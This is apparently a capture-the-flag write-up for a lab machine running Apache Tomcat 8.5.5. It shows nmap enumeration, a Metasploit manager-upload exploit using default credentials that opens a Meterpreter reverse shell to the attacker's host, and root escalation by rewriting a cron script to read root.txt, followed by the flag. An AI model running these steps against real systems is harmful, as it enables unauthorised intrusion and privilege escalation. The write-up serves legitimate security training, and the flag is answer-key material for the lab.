Enum first, always!

```
nmap -A -T4 -oN nmap/initial 10.10.70.222

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 19:03 +07
Nmap scan report for 10.10.70.222
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Got port HTTP on port 8080. Using metasploit to exploit upload tomcat since we already have username and password (tomcat, s3cret).

```
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   19  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   20  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   21  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration


msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > use  17
msf5 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf5 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.70.222
rhosts => 10.10.70.222
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.8.15.76:4444 
[*] Retrieving session ID and CSRF token...
[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf5 exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
httppassword => s3cret
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.8.15.76:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying uXzMm99rAg8qFQqWKxqm...
[*] Executing uXzMm99rAg8qFQqWKxqm...
[*] Sending stage (53905 bytes) to 10.10.70.222
[*] Meterpreter session 1 opened (10.8.15.76:4444 -> 10.10.70.222:45752) at 2020-05-24 19:16:30 +0700
[*] Undeploying uXzMm99rAg8qFQqWKxqm ...

meterpreter > ls
```

id.sh file is a cron jobs, so we just need to cat the root.txt into the cron jobs file.

```
echo "cat /root/root.txt > user.txt" > id.sh

d89d5391984c0450a95497153ae7ca3a
```